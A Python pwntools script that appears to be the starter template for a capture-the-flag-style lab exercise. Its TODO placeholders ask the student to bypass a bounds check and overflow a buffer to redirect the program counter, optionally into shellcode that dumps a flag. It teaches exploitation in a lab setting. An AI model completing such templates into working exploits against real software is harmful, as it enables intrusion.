#!/usr/bin/env python3
from pwn import *

# Uncomment this to see every single byte sent / received between you and the remote CPU:
# context.log_level='debug'

# Uncomment this to run without a debugger:
io=process(['./run.sh', 'part4'])

# Uncomment this to wait for the debugger:
# io=process(['./run.sh', 'part4', '--debug'])

# Uncomment this to try on the remote CPU:
# io=remote('127.0.0.1', 31337)

FIRSTNAME_LEN=b'0' # TODO: Fill this in to bypass the bounds check!
LASTNAME_LEN=b'0'  # TODO: Fill this in to bypass the bounds check!

# Read in the shellcode binary:
# For 4.1: Leave this blank:
shellcode = b''

# For 4.3: Read from a file (or set it however you want!)
# shellcode_f=open('part4/dump_flag.bin', 'rb')
# shellcode=shellcode_f.read()

# Send the first name length
print(io.recvuntil(b': ').decode())
io.send(FIRSTNAME_LEN+b'\n')
print(FIRSTNAME_LEN)

# Send the last name length
print(io.recvuntil(b': ').decode())
io.send(LASTNAME_LEN+b'\n')
print(LASTNAME_LEN)

print(io.recvuntil(b': ').decode())

buf = shellcode
buf += b'A' * (cyclic_find(0) - len(buf)) #TODO: Fill in cyclic_find with the pc you found by crashing with a large cyclic() input buffer
buf += p32(0) #TODO: Fill in with where you want pc to go

# When you are done sending bytes, run interactive()
# so that you can observe the response! (which is hopefully the flag!)
io.interactive()
